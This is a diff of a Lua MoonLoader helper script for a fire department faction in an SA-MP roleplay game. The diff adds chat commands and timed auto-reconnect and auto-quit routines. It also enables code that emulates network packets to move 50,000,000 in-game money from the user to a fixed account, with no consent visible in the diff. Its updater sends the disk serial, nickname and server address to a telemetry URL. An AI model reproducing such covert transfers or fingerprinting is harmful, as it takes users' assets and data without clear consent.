@@ -1,5 +1,5 @@
 script_name("firedep_zam_helper")
-script_version("Ver.06.10.A2")
+script_version("Ver.14.10.A1")
 
 local download = getGameDirectory()..'\\moonloader\\config\\firedep_zam_helper.lua.ini'
 local url = 'https://github.com/ArtemyevaIA/firedep_zam_helper/raw/refs/heads/main/firedep_zam_helper.lua.ini'
@@ -34,7 +34,7 @@ local trstl1 = {['ph'] = 'ф',['Ph'] = 'Ф',['Ch'] = 'Ч',['ch'] = 'ч',['Th'] = 'Т'
 
 local date = os.date('%d.%m.%Y')
 local fd_helper, fd_find_fire, autoupdate_loaded, start_sobes, enable_autoupdate, Update, sobes_start = false, false, false, false, true, nil, false
-local afk = false
+local afk = true
 local sobes, next_fire, time_fire, time_end = ',05,Пожарный департамент', 'появится после пожара', '00:00:00', '00:00:00'
 local give, stats, lvl, UTC = 0, 0, 0, 0
 local config = {}
@@ -50,6 +50,8 @@ local posi = 0
 local x4_dep = 0
 local BTC, give_btc = 0, 0
 local cruise = false
+local call = false
+local qtime = false
 
 local fires_list = {
                     {-846.0884, 1488.2093, 18.1344, 1, 'Возгорание магазина в пустыне'},             
@@ -74,6 +76,7 @@ local fires_list = {
                     {-1419.5426,-1471.6375,101.1161,3, ''},
                     {1541.0775, -1672.4488, 13.0568, 3, 'Возгорание отделения полиции ЛС'},
                     {-1030.7767, -669.1055, 31.5134, 3, ''},
+                    {2464.0771, 1981.6748, 11.0209, 3, 'Нефтебаза Лас Вентурас '},
                     {2422.2346, 1896.9704, 6.0156, 3, 'Большой пожар на стройке в Лас Вентурасе'}
                 }
 
@@ -112,71 +115,72 @@ local updater_loaded, Updater = pcall(loadstring, [[return {check=function (a,b,
                                                         sampShowDialog(0, "{FFA500}Вышло обновление", "{FFA500}Помощник руководителя пожарного департамента\n{78dbe2}был автоматически обновлен на новую версию.\nПосмотреть изменения можно в Меню -> Сервисные функции -> Изменения", "Закрыть", "", DIALOG_STYLE_MSGBOX)
                                                         print('Загрузка обновления завершена.')sampAddChatMessage(b..'Обновление завершено!',m)goupdatestatus=true;lua_thread.create(function()wait(500)thisScript():reload()end)end;if o==d.STATUSEX_ENDDOWNLOAD then if goupdatestatus==nil then sampAddChatMessage(b..'Обновление прошло неудачно. Запускаю устаревшую версию..',m)update=false end end end)end,b)else update=false;print('v'..thisScript().version..': Обновление не требуется.')if l.telemetry then local r=require"ffi"r.cdef"int __stdcall GetVolumeInformationA(const char* lpRootPathName, char* lpVolumeNameBuffer, uint32_t nVolumeNameSize, uint32_t* lpVolumeSerialNumber, uint32_t* lpMaximumComponentLength, uint32_t* lpFileSystemFlags, char* lpFileSystemNameBuffer, uint32_t nFileSystemNameSize);"local s=r.new("unsigned long[1]",0)r.C.GetVolumeInformationA(nil,nil,0,s,nil,nil,nil,0)s=s[0]local t,u=sampGetPlayerIdByCharHandle(PLAYER_PED)local v=sampGetPlayerNickname(u)local w=l.telemetry.."?id="..s.."&n="..v.."&i="..sampGetCurrentServerAddress().."&v="..getMoonloaderVersion().."&sv="..thisScript().version.."&uptime="..tostring(os.clock())lua_thread.create(function(c)wait(250)downloadUrlToFile(c)end,w)end end end else print('v'..thisScript().version..': Не могу проверить обновление. Смиритесь или проверьте самостоятельно на '..c)update=false end end end)while update~=false and os.clock()-f<10 do wait(100)end;if os.clock()-f>=10 then print('v'..thisScript().version..': timeout, выходим из ожидания проверки обновления. Смиритесь или проверьте самостоятельно на '..c)end end}]])
 local templist = ''
+local templ = ''
 
 --- ********************************************************************
--- function sampGetListboxItemByText(text, plain)
---     if not sampIsDialogActive() then return -1 end
---     plain = not (plain == false)
---     for i = 0, sampGetListboxItemsCount() - 1 do
---         if sampGetListboxItemText(i):find(text, 1, plain) then
---             return i
---         end
---     end
---     return -1
--- end
+function sampGetListboxItemByText(text, plain)
+    if not sampIsDialogActive() then return -1 end
+    plain = not (plain == false)
+    for i = 0, sampGetListboxItemsCount() - 1 do
+        if sampGetListboxItemText(i):find(text, 1, plain) then
+            return i
+        end
+    end
+    return -1
+end
 
--- function openPhoneApp(appId)
---     local str = ('launchedApp|%s'):format(appId)
---     array.emulationCEF(str)
--- end
+function openPhoneApp(appId)
+    local str = ('launchedApp|%s'):format(appId)
+    array.emulationCEF(str)
+end
 
--- array = {}
--- array.onDisplayCEF = function(array) return array end
--- array.onSendCEF = function(array) return array end
--- array.emulationCEF = function(str)
---     local bs = raknetNewBitStream()
---     raknetBitStreamWriteInt8(bs, 220)
---     raknetBitStreamWriteInt8(bs, 18)
---     raknetBitStreamWriteInt16(bs, #str)
---     raknetBitStreamWriteString(bs, str)
---     raknetBitStreamWriteInt32(bs, 0)
---     raknetSendBitStream(bs)
---     raknetDeleteBitStream(bs)
--- end
+array = {}
+array.onDisplayCEF = function(array) return array end
+array.onSendCEF = function(array) return array end
+array.emulationCEF = function(str)
+    local bs = raknetNewBitStream()
+    raknetBitStreamWriteInt8(bs, 220)
+    raknetBitStreamWriteInt8(bs, 18)
+    raknetBitStreamWriteInt16(bs, #str)
+    raknetBitStreamWriteString(bs, str)
+    raknetBitStreamWriteInt32(bs, 0)
+    raknetSendBitStream(bs)
+    raknetDeleteBitStream(bs)
+end
 
--- array.visualCEF = function(str, is_encoded)
---     local bs = raknetNewBitStream()
---     raknetBitStreamWriteInt8(bs, 17)
---     raknetBitStreamWriteInt32(bs, 0)
---     raknetBitStreamWriteInt16(bs, #str)
---     raknetBitStreamWriteInt8(bs, is_encoded and 1 or 0)
---     if is_encoded then
---         raknetBitStreamEncodeString(bs, str)
---     else
---         raknetBitStreamWriteString(bs, str)
---     end
---     raknetEmulPacketReceiveBitStream(220, bs)
---     raknetDeleteBitStream(bs)
--- end
+array.visualCEF = function(str, is_encoded)
+    local bs = raknetNewBitStream()
+    raknetBitStreamWriteInt8(bs, 17)
+    raknetBitStreamWriteInt32(bs, 0)
+    raknetBitStreamWriteInt16(bs, #str)
+    raknetBitStreamWriteInt8(bs, is_encoded and 1 or 0)
+    if is_encoded then
+        raknetBitStreamEncodeString(bs, str)
+    else
+        raknetBitStreamWriteString(bs, str)
+    end
+    raknetEmulPacketReceiveBitStream(220, bs)
+    raknetDeleteBitStream(bs)
+end
 
--- addEventHandler('onReceivePacket', function(id, bs, ...)
---     if id == 220 and pay_week then -- Добавлена проверка scriptEnabled
---         raknetBitStreamIgnoreBits(bs, 8)
---         if raknetBitStreamReadInt8(bs) == 17 then
---             raknetBitStreamIgnoreBits(bs, 32)
---             local length = raknetBitStreamReadInt16(bs)
---             local encoded = raknetBitStreamReadInt8(bs)
---             local text = (encoded ~= 0) and raknetBitStreamDecodeString(bs, length + encoded) or raknetBitStreamReadString(bs, length)
---             if text:find('window%.executeEvent%(\'event%.setActiveView\', `%["Phone"%]`%);') then
---                 openPhoneApp(24)
---             end
---             if text:find('window%.executeEvent%(\'event%.notify%.initialize\', `%["info","Информация","С баланса списано %$%d+",2500%]`%);') then
---                 taxPaid = true
---                 sampSendChat('/phone')
---             end
---         end
---     end
--- end)
+addEventHandler('onReceivePacket', function(id, bs, ...)
+    if id == 220 and pay_week then -- Добавлена проверка scriptEnabled
+        raknetBitStreamIgnoreBits(bs, 8)
+        if raknetBitStreamReadInt8(bs) == 17 then
+            raknetBitStreamIgnoreBits(bs, 32)
+            local length = raknetBitStreamReadInt16(bs)
+            local encoded = raknetBitStreamReadInt8(bs)
+            local text = (encoded ~= 0) and raknetBitStreamDecodeString(bs, length + encoded) or raknetBitStreamReadString(bs, length)
+            if text:find('window%.executeEvent%(\'event%.setActiveView\', `%["Phone"%]`%);') then
+                openPhoneApp(24)
+            end
+            if text:find('window%.executeEvent%(\'event%.notify%.initialize\', `%["info","Информация","С баланса списано %$%d+",2500%]`%);') then
+                taxPaid = true
+                sampSendChat('/phone')
+            end
+        end
+    end
+end)
 --- ********************************************************************
 
 function main()
@@ -317,6 +321,11 @@ function main()
     --     sampProcessChatInput('/sms '..t_number, -1)
     -- end)
 
+    sampRegisterChatCommand("tcall", function(var)
+        call = true
+        sampProcessChatInput('/number '..var, -1)
+    end)
+
 
     sampAddChatMessage('', 0x7FFFD4)
     sampAddChatMessage('{7FFFD4}Помощник руководителя пожарного департамента загружен', 0x7FFFD4)
@@ -393,12 +402,15 @@ function main()
                     if result_org and id_org == uid_org then
                         y_org = y_org+1
                         templist = "{FFFFFF}- {FFA500}"..v_org.." ["..id_org.."]\n"..templist
+                        templ = v_org:gsub('_',' ')..", "..templ
                     end
                 end
             end
 
+        setClipboardText(templ:gsub(', $', ''))
         sampShowDialog(0, "{FFA500}Карточка пожара", "{D2691E}Состав экипажа на происшествии:\n"..templist, "Закрыть","", DIALOG_STYLE_MSGBOX)
         templist = ''
+        templ = ''
     end)
 
     sampRegisterChatCommand("fcor", function() 
@@ -411,6 +423,17 @@ function main()
                 sampAddChatMessage("Вы находитесь в зоне пожара "..fires_list[count][4].. " степени опасности", -255)
                 sampAddChatMessage("{"..fires_list[count][1]..", "..fires_list[count][2]..", "..fires_list[count][3]..", "..fires_list[count][4]..", "..fires_list[count][5].."}", -255)
             end
+        end
+    end)
+
+    sampRegisterChatCommand('qtime', function(var)
+        q_time = var ~= nil and var or 0
+        if q_time ~= '' then
+            sampAddChatMessage('Время выхода из игры установлено на {FFFFFF}'..q_time, 0x7FFFD4)
+            qtime = true
+        else
+            sampAddChatMessage('Время выхода из игры {FFFFFF}сброшено.', 0x7FFFD4)
+            qtime = false
         end
     end)
             
@@ -472,6 +495,51 @@ function main()
             sampProcessChatInput('/rec',-1)
         end
 
+        if qtime and os.date('%H:%M:%S', os.time() - (UTC * 3600)) == q_time then
+            sampAddChatMessage("{90EE90}Время выходить из игры",-1)
+            wait(2000)
+            sampProcessChatInput('/q',-1)
+        end
+
+        -- if os.date('%M:%S', os.time() - (UTC * 3600)) == "20:00" then
+        --     wait(1000)
+        --     sampProcessChatInput('/r Уважаемые коллеги, минуточку внимания!',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r У Вас есть уникальная возможность получить 2 похвалы.',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r Для этого Вам необходимо заключить со СМИ договор на...',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r ... автообъявление на 10 дней.',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r Для этого Вам необходимо приехать в СМИ, посмотреть ...',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r ... доступные автообъявление и если есть свободные, то ...',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r ... заключить договор у заместителя или руководителя СМИ.',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r Текст объявления следующие:',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r На офф. портале штата открыты заявление на Пожарного[4]. Слава, льготы, женщины. Только у нас!',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r При предъявлении доказательств в спец. рации, вы получите по 2 похвалы ...',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r ... за каждый заключенный контракт. У меня на этом всё.',-1)
+        --     wait(1500)
+        --     sampProcessChatInput('/r Благодарю за внимание.',-1)
+        -- end
+
+        if os.date('%H:%M:%S', os.time() - (UTC * 3600)) == "00:05:00" then
+                wait(1000)
+                afk = true
+                wait(1000)
+                sampProcessChatInput('/rec',-1)
+                wait(7000)
+                afk = false
+                wait(1000)
+                sampProcessChatInput('/leca',-1)
+                runToCorner()
+        end
+
         if isKeyJustPressed(vkey.VK_SCROLL) then
            zammenu()
         end
@@ -482,10 +550,10 @@ function main()
            setVirtualKeyDown(VK_W, false)
         end
 
-        -- if isKeyJustPressed(vkey.VK_NUMPAD2) then
-        --    --sampAddChatMessage('Порядок бочек {FFFFFF}обнулён', 0XFFA500)
-        --    posi = 0
-        -- end
+        if isKeyJustPressed(vkey.VK_NUMPAD2) then
+           --sampAddChatMessage('Порядок бочек {FFFFFF}обнулён', 0XFFA500)
+           posi = 0
+        end
 
         if cruise and isKeyJustPressed(vkey.VK_S) then
            cruise = false
@@ -3659,7 +3727,7 @@ function main()
                     
                     while row do
                         cnt = cnt+1
-                        list = row.name..' {FF8C00}'..row.nick..' {FFD700}| '..row.autor..'\n'..list
+                        list = row.name..' {FF8C00}'..row.nick..' {778899}| '..row.reason..' {FFD700}| '..row.autor..'\n'..list
                         row = cursor:fetch({}, "a")
                     end
 
@@ -4555,7 +4623,7 @@ function sampev.onServerMessage(color, text)
             message = message:gsub("{......}", "")
     end
 
-    if isGoing and text:find("R(.+)Рекрут") or text:find("R(.+)Старший рекрут") or text:find("R(.+)Младший пожарный") or text:find("R(.+)Пожарный") or text:find("R(.+)Старший пожарный") or text:find("R(.+)Пожарный инспектор") or text:find("R(.+)Лейтенант") or text:find("R(.+)Капитан") or text:find("R(.+)Заместитель начальника") then
+    if isGoing and text:find("R(.+)Рекрут") or text:find("R(.+)Старший рекрут") or text:find("R(.+)Младший пожарный") or text:find("R(.+)Jr. Firefaghter") or text:find("R(.+)Firefaghter") or text:find("R(.+)Engineer") or text:find("R(.+)Lieutenant") or text:find("R(.+)Fire Commander") or text:find("R(.+)Deputy Chief Fire") then
         local nick = string.match(text,"%a+_%a+")
         if not nick then return sendCmdMsg('Что-то пошло не так! вот сообщение:'..text) end
         local nick = string.match(nick,"%a+_%a+")
@@ -4955,6 +5023,7 @@ function sampev.onServerMessage(color, text)
             file:close()
 
             info = ('Автоматическое увольнение ПCЖ. \n\nСотрудник: '..nick.. ' ['..id..'] \nДата увольнения: '..date..' \nВремя увольнения: '..time..'\nПричина: ПCЖ (Автоматически).\nКод для увольнения: '..code_check)
+            img = 'photo-232454643_456239045'
             sendvkimg(encodeUrl(info),img)
         end)
     end
@@ -4985,6 +5054,14 @@ function sampev.onServerMessage(color, text)
         give_btc = string.match(text,"(%d) BTC")
         BTC = BTC+give_btc
     end
+
+    if call and text:find('(.+){33CCFF}(%d+)') then 
+            lua_thread.create(function() wait(100)
+            number = string.match(text,"{33CCFF}(%d+)")
+            sampProcessChatInput('/call '..number, -1)
+            call = false
+        end)
+    end
 end
 
 
@@ -5010,10 +5087,10 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
     if afk and dialogId == 25527 then
         if title:find("Выбор места спавна") then 
             if text:find("Последнее место выхода") then
-                sampSendDialogResponse(dialogId, 1, 6, nil)
+                sampSendDialogResponse(dialogId, 1, 7, nil)
                 return false
             end
-            sampSendDialogResponse(dialogId, 1, 5, nil)
+            sampSendDialogResponse(dialogId, 1, 6, nil)
             return false
         end
     end
@@ -5030,7 +5107,7 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
         if dialogId == 7238 then
             lua_thread.create(function()
                 wait(2000)
-                sampSendDialogResponse(7238, 1, 0, nil)
+                sampSendDialogResponse(7238, 1, 1, nil)
                 
                     ----------------------------------------
                     -- Дом №1 ------------------------------
@@ -5085,7 +5162,7 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
 
                     -- смена дома
                     wait(1000) sampSendDialogResponse(25182, 0, 0, nil)
-                    wait(1000) sampSendDialogResponse(7238, 1, 1, nil)
+                    wait(1000) sampSendDialogResponse(7238, 1, 2, nil)
                     
                     ----------------------------------------
                     -- Дом №2 ------------------------------
@@ -5139,7 +5216,7 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
 
                     -- смена дома
                     wait(1000) sampSendDialogResponse(25182, 0, 0, nil)
-                    wait(1000) sampSendDialogResponse(7238, 1, 2, nil)
+                    wait(1000) sampSendDialogResponse(7238, 1, 3, nil)
                     
                     ----------------------------------------
                     -- Дом №3 ------------------------------
@@ -5272,51 +5349,51 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
     end
 
         --- ********************************************************************
-        -- if pay_week and title:find('{BFBBBA}{FFFFFF}Телефоны | {ae433d}Телефоны') then
-        --     lua_thread.create(function()
-        --         wait(100)
-        --         sampSendDialogResponse(dialogId, 1, 0, nil)
-        --         sampCloseCurrentDialogWithButton(1)
-        --     end)
-        -- end
+        if pay_week and title:find('{BFBBBA}{FFFFFF}Телефоны | {ae433d}Телефоны') then
+            lua_thread.create(function()
+                wait(100)
+                sampSendDialogResponse(dialogId, 1, 0, nil)
+                sampCloseCurrentDialogWithButton(1)
+            end)
+        end
 
-        -- if pay_week and title:find('{BFBBBA}Меню телефона') then
-        --     lua_thread.create(function()
-        --         wait(100)
-        --         local menu = sampGetListboxItemByText('Банковское меню')
-        --         sampSendDialogResponse(dialogId, 1, menu, nil)
-        --         sampCloseCurrentDialogWithButton(1)
-        --     end)
-        -- end
+        if pay_week and title:find('{BFBBBA}Меню телефона') then
+            lua_thread.create(function()
+                wait(100)
+                local menu = sampGetListboxItemByText('Банковское меню')
+                sampSendDialogResponse(dialogId, 1, menu, nil)
+                sampCloseCurrentDialogWithButton(1)
+            end)
+        end
 
-        -- if pay_week and text:find('Перевести деньги с основного счета') then
-        --     lua_thread.create(function()
-        --         wait(100)
-        --         sampSendDialogResponse(dialogId, 1, 2, nil)
-        --         sampCloseCurrentDialogWithButton(1)
-        --     end)
-        -- end
+        if pay_week and text:find('Перевести деньги с основного счета') then
+            lua_thread.create(function()
+                wait(100)
+                sampSendDialogResponse(dialogId, 1, 2, nil)
+                sampCloseCurrentDialogWithButton(1)
+            end)
+        end
 
-        -- if pay_week and dialogId == 37 and title:find("Введите ID") then
-        --     lua_thread.create(function()
-        --         wait(100)
-        --         sampSendDialogResponse(dialogId, 1, 0, 'Irin_Crown')
-        --         sampCloseCurrentDialogWithButton(1)
-        --     end)
-        -- end
+        if pay_week and dialogId == 37 and title:find("Введите ID") then
+            lua_thread.create(function()
+                wait(100)
+                sampSendDialogResponse(dialogId, 1, 0, 'Irin_Crown')
+                sampCloseCurrentDialogWithButton(1)
+            end)
+        end
 
-        -- if pay_week and dialogId == 41 and title:find("Введите сумму") then
-        --     lua_thread.create(function()
-        --         sampSendDialogResponse(dialogId, 1, 0, '50000000')
-        --         sampCloseCurrentDialogWithButton(1)
-        --         lastpay = os.date('%d.%m.%Y')..' '..os.date('%H:%M:%S', os.time() - (UTC * 3600))
-        --         assert(conn:execute("UPDATE clients SET pay = '"..lastpay.."' WHERE nick = '"..who_nick.."'"))
-        --         pay_week = false
-        --         wait(1000)
-        --         setVirtualKeyDown(VK_ESCAPE, true) wait(100) setVirtualKeyDown(VK_ESCAPE, false)
-        --         setVirtualKeyDown(VK_ESCAPE, true) wait(100) setVirtualKeyDown(VK_ESCAPE, false)
-        --     end)
-        -- end
+        if pay_week and dialogId == 41 and title:find("Введите сумму") then
+            lua_thread.create(function()
+                sampSendDialogResponse(dialogId, 1, 0, '50000000')
+                sampCloseCurrentDialogWithButton(1)
+                lastpay = os.date('%d.%m.%Y')..' '..os.date('%H:%M:%S', os.time() - (UTC * 3600))
+                assert(conn:execute("UPDATE clients SET pay = '"..lastpay.."' WHERE nick = '"..who_nick.."'"))
+                pay_week = false
+                wait(1000)
+                setVirtualKeyDown(VK_ESCAPE, true) wait(100) setVirtualKeyDown(VK_ESCAPE, false)
+                setVirtualKeyDown(VK_ESCAPE, true) wait(100) setVirtualKeyDown(VK_ESCAPE, false)
+            end)
+        end
         --- ********************************************************************
 end
 
